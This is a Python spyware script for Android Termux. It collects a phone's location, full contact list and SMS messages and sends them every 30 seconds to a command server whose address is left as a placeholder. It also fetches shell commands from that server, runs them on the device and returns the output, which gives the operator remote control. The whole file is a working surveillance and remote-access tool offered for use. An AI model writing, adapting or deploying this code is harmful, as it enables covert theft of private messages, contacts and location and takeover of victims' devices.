import os, sys, time, json, requests, subprocess, socket, platform
from datetime import datetime

SERVER = "http://IP_SERVER_ANDA:5000"
UNIQUE_ID = "ALZZ-XXXXX"

def get_data():
    try:
        loc = subprocess.run(['termux-location'], capture_output=True, text=True, timeout=5)
        loc = loc.stdout if loc.returncode == 0 else "{}"
    except: loc = "{}"
    try:
        cont = subprocess.run(['termux-contact-list'], capture_output=True, text=True, timeout=5)
        cont = cont.stdout if cont.returncode == 0 else "[]"
    except: cont = "[]"
    try:
        sms = subprocess.run(['termux-sms-list'], capture_output=True, text=True, timeout=5)
        sms = sms.stdout if sms.returncode == 0 else "[]"
    except: sms = "[]"
    return {
        "unique_id": UNIQUE_ID,
        "device": platform.node(),
        "os": platform.system(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "location": loc,
        "contacts": cont,
        "sms": sms,
        "timestamp": datetime.now().isoformat()
    }

def exec_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr
    except: return "Error"

def main():
    while True:
        try:
            requests.post(f"{SERVER}/data", json=get_data(), timeout=10)
            r = requests.get(f"{SERVER}/cmd/{UNIQUE_ID}", timeout=10)
            if r.status_code == 200 and r.json().get("command"):
                cmd = r.json()["command"]
                result = exec_cmd(cmd)
                requests.post(f"{SERVER}/result/{UNIQUE_ID}", json={"result": result})
            time.sleep(30)
        except:
            time.sleep(60)

if __name__ == "__main__":
    main()
